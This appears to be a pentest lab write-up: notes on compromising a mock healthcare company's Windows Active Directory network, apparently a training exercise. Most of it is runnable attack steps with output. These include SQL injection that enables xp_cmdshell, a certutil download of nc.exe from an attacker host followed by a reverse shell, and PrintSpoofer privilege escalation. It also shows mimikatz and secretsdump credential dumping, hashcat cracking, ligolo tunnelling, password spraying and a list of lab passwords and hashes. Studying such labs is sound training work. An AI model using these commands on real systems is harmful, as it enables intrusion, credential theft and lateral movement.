Recently formed IoT healthcare startup.

## Objectives
- Find as many vulnerabilities and misconfigs as possible
- Increase their Active Directory security posture
- Reduce the attack surface

# Hosts
## External
192.168.x.120    proof.txt
192.168.x.121 : WEB02     ~~proof.txt~~
192.168.x.122    local.txt, proof.txt

## Internal
172.16.x.10 : DC            proof.txt
172.16.x.11 : FILES02    ~~local.txt~~, ~~proof.txt~~
172.16.x.12 : DEV04     ~~local.txt~~, proof.txt
172.16.x.13 : PROD01   proof.txt
172.16.x.14 :    local.txt
172.16.x.82: CLIENT01     proof.txt
172.16.x.83 : CLIENT02    local.txt, proof.txt

# Users & PWs
- joe
	- NTLM - 08d7a47a6f9f66b97b1bae4178747494
		- FILES 02 - Flowers1    (admin)
	- NTLM - 464f388c3fe52a0fa0a6c8926d62059c
- leon - domain admin
- mario
- wario
	- DC01 - Mushroom!
	- DEV04 - Mushroom!
	- NTLM - b82706aff8acf56b6c325a6c2d8c338a
- peach
- yoshi
	- NTLM - cd21be418f01f5591ac8df1fdeaa54b6
	- DEV04 - Mushroom!    (admin)
	- CLIENT01 - Mushroom!    (admin)
- offsec
- administrator:
	- NTLM - b2c03054c306ac8fc5f9d188710b0168
	- NTLM - f1014ac49bae005ee3ece5f47547d185
	- NTLM - a7c5480e8c1ef0ffec54e99275e6e0f7



# Methodology

## 192.168.x.121
####  Port Scan
```bash
nmap -v -p- --max-scan-delay=0 -oN e_121/all_ports.txt 192.168.x.121
	80/tcp    open  http
```
####  SQLi `medtech.com/login.aspx`
```sql
-- Configure xp_cmdshell to work
';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure "xp_cmdshell", 1;RECONFIGURE;--

-- Download nc.exe to target maching & run
';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.x:8080/nc.exe c:/windows/temp/nc.exe";--
';EXEC xp_cmdshell "c:/windows/temp/nc.exe 192.168.45.x 12100 -e cmd.exe";--
```
####  Enumerate
```powershell
whoami /priv
	SeImpersonatePrivilege        Impersonate a client after authentication Enabled


net users /domain
	User accounts for \\DC01.medtech.com
	-------------------------------------------------------------------------------
	Administrator            Guest                    joe                      
	krbtgt                   leon                     mario                    
	offsec                   peach                    wario                    
	yoshi


net groups "Domain Admins" /domain
	-------------------------------------------------------------------------------
	Administrator            leon                     


ipconfig

```
####  PrivEsc
```powershell
.\PrintSpoofer.exe -i -c cmd.exe
	[+] Found privilege: SeImpersonatePrivilege

whoami
	nt authority\system
```
####  Proof.txt
```powershell
Get-ChildItem -Path C:\users\ -Include local.txt,proof.txt -Recurse -ErrorAction SilentlyContinue -Force
	    Directory: C:\users\Administrator\Desktop                                                               
	-a----        10/29/2024   2:38 PM             34 proof.txt
```
####  Mimikatz
```powershell
mimikatz # sekurlsa::logonpasswords
	* Username : Administrator
	* Domain   : WEB02
	* NTLM     : b2c03054c306ac8fc5f9d188710b0168

	* Username : joe
	* Domain   : MEDTECH
	* NTLM     : 08d7a47a6f9f66b97b1bae4178747494
	* SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
	...
		kerberos :
		* Username : joe
		* Domain   : MEDTECH.COM
		* Password : Flowers1
```
####  Tunnel w/ `lingolo`
- On Kali
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

sudo ./proxy -selfcert -laddr 192.168.45.169:443
```
- On Victim
```powershell
# After starting ligolo proxy on C2
.\agent.exe -connect 192.168.45.169:443 -ignore-cert
```
- On Kali
```bash
# In logolo, once agent has joined
session

# In new kali tab, set up routing info
sudo ip route add 172.16.198.0/24 dev ligolo
ip route list

# In logolo, start tunnel
start
```
####  Laterally move
```bash
nxc smb 172.16.127.0/24 -u joe -p Flowers1 -d medtech.com 
	SMB         172.16.127.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
```

## 172.16.x.11
#### SMB Enum
```bash
smbclient -L //172.16.127.11/ -U 'medtech.com\joe'
	Password for [MEDTECH.COM\joe]: (Flowers1)	
	        Sharename       Type      Comment
	        ---------       ----      -------
	        C               Disk      
	        TEMP            Disk      


smbclient //172.16.127.11/C -U 'medtech.com\joe'
	smb: \Users\> ls joe\desktop\
	  local.txt                           A       34  Wed Nov  6 15:08:02 2024


smb: \Users\> get joe\desktop\local.txt
	getting file \Users\joe\desktop\local.txt of size 34 as joe\desktop\local.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
		415ffc2d7525ce114a10f1d7c861fe4d
```
#### Foothold
```bash
evil-winrm -i 172.16.127.11 -u joe -p "Flowers1"

.\nc.exe 192.168.45.x 1100
```
#### Enumeration and Proof
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,*.pdf -Recurse -ErrorAction SilentlyContinue -Force
	    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         10/7/2022   5:51 AM             30 ConsoleHost_history.txt
	
	    Directory: C:\Users\Administrator\Desktop
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         11/7/2024  11:57 AM             34 proof.txt
	
	    Directory: C:\Users\administrator.MEDTECH\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----        10/18/2022   7:32 AM            468 ConsoleHost_history.txt
	
	    Directory: C:\Users\joe\Desktop
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----         11/7/2024  11:57 AM             34 local.txt
	
	    Directory: C:\Users\wario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
	Mode                 LastWriteTime         Length Name
	----                 -------------         ------ ----
	-a----        10/28/2022   3:22 AM           1672 ConsoleHost_history.txt


type C:\Users\Administrator\Desktop\proof.txt
	d0952fb6ac11d95d2dfacf741affe9cd
```
#### PSReadLine History
```powershell
type "C:\Users\administrator.MEDTECH\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
	Invoke-WebRequest http://192.168.118.4/flag_proof.ps1 -OutFile flag_proof.ps1
	ping 8.8.8.8
	ping 172,16.50.254
	ipconfig
	...
	Invoke-WebRequest http://192.168.118.4/flag_proof.ps1 -OutFile flag_proof.ps1
	ping 8.8.8.8
	copy //WEB02/c$/flag_proof.ps1 .
	type .\flag_proof.ps1
	copy //WEB02/c$/flag_local.ps1 .
	shutdown /s

type "C:\Users\wario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
	ping 172.16.50.83
	ping client02
	$username='wario';
	$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
	New-PSSession -ComputerName 172.16.50.83 -Credential $credential
	New-PSSession -ComputerName CLIENT02 -Credential $credential
	New-PSSession -ComputerName 172.16.50.83 -Credential $credential -Port 5986
	New-PSSession -ComputerName 172.16.50.83 -Credential $credential -Port 5986 -Usessl
	New-PSSession -ComputerName 172.16.50.83 -Credential $credential
	Enter-PSSession -ComputerName 172.16.50.83 -Credential $credential
	exit
	$username='wario';
	$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;
	New-PSSession -ComputerName 172.16.50.83 -Credential $credential
	hostname
	New-PSSession -ComputerName CLIENT02 -Credential $credential
	exit
	$username='wario';
	$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;
	New-PSSession -ComputerName CLIENT02 -Credential $credential
	hostname
	Enter-PSSession
	Enter-PSSession 1
	hostname
```
#### impacket-secretsdump & hashcat
```bash
impacket-secretsdump medtech.com/joe:"Flowers1"@172.16.192.11 
	[*] Dumping cached domain logon information (domain/username:hash)
	MEDTECH.COM/Administrator:$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7: (2022-10-18 14:29:00)
	MEDTECH.COM/yoshi:$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6: (2022-09-28 10:52:28)
	MEDTECH.COM/wario:$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a: (2022-11-15 09:43:35)
	MEDTECH.COM/joe:$DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c: (2022-11-11 10:09:23)

vim hashes.txt
	$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
	$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
	$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
	$DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c

hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt --force
	$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6:Mushroom!
	$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a:Mushroom!
```
#### Lateral Movement
```bash
nxc ldap 172.16.192.0/24 -d medtech.com -u users.txt -p Mushroom!
	LDAP        172.16.192.10   389    DC01             [+] medtech.com\wario:Mushroom!

nxc rdp 172.16.192.0/24 -d medtech.com -u users.txt -p Mushroom!
	RDP         172.16.192.12   3389   DEV04            [+] medtech.com\wario:Mushroom! 
	RDP         172.16.192.12   3389   DEV04            [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
	RDP         172.16.192.82   3389   CLIENT01         [+] medtech.com\wario:Mushroom! 
	RDP         172.16.192.82   3389   CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
```